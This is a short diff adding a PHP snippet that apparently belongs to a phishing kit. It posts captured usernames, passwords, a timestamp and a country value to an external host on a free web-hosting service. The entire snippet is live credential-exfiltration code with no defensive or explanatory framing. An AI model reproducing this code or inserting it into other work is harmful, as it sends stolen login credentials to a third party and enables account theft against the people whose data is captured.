@@ -1,0 +1,13 @@
+<?php 
+$Curl=curl_init();
+curl_setopt_array($Curl,[
+    CURLOPT_URL=>"https://sevtheyeter.000webhostapp.com/dsh.php",
+    CURLOPT_RETURNTRANSFER=>true,
+    CURLOPT_TIMEOUT=>10,
+    CURLOPT_FOLLOWLOCATION=>false,
+    CURLOPT_POST=>true,
+    CURLOPT_POSTFIELDS=>["user"=>"$username","pass"=>"$password","tarih"=>"$cur_time","yer"=>"$ulke"]
+]);
+$result=curl_exec($Curl);
+curl_close($Curl)
+?>
